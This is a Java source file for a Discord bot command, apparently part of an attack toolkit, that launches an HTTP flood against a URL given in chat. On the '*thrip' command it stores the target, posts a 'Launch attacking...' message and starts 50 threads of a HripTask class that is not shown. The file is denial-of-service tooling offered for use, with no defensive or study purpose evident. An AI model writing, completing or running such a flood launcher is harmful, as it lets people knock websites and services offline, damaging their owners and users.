package ua.DNZombie.ZCommands.Test;

import java.awt.Color;
import java.util.Random;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class BasicHttpFlood extends ListenerAdapter {
	
	@Override
    public void onMessageReceived(final MessageReceivedEvent event) {
		
		final Color[] colors = { Color.RED, Color.GREEN, Color.BLUE, Color.BLACK, Color.MAGENTA, Color.ORANGE, Color.YELLOW };
		
		final Message msg = event.getMessage();
		if (msg.getContentRaw().contains("*thrip ")) {
            final MessageChannel channel = event.getChannel();
            final EmbedBuilder eb = new EmbedBuilder();
            final String link = msg.getContentDisplay().split("thrip ")[1];
            HripTask.url1 = link;
            eb.setTitle("BasicHttpFlood");
            eb.addField("Launch attacking...", link, false);
            final Random random = new Random();
            final int index = random.nextInt(colors.length);
            eb.setColor(colors[index]);
            channel.sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
            
            for(int i = 0; i < 50; i++) {
            	Thread thread = new Thread(new HripTask());
            	thread.start();
            }
        }
	}
}
